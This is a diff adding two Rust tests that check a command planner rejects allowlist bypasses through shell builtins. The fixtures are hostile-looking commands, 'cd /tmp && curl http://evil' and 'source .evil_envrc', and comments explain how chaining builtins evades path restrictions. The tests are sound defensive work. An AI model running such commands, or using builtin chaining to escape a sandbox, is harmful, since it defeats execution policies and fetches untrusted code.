@@ -236,4 +236,25 @@ mod tests {
             .await;
         assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
     }
+
+    /// P2-3 (#2189): `cd` is a shell builtin, not a standalone executable.
+    /// Any command wrapped with `cd /tmp && evil` can bypass path restrictions.
+    /// It must not appear on the allowlist.
+    #[tokio::test]
+    async fn blocks_cd_shell_bypass() {
+        let err = DeterministicPlanner::default()
+            .compile(wf(&["cd /tmp && curl http://evil"]))
+            .await;
+        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
+    }
+
+    /// P2-3 (#2189): `source` is a shell builtin that executes arbitrary scripts.
+    /// It must not appear on the allowlist.
+    #[tokio::test]
+    async fn blocks_source_shell_bypass() {
+        let err = DeterministicPlanner::default()
+            .compile(wf(&["source .evil_envrc"]))
+            .await;
+        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
+    }
 }
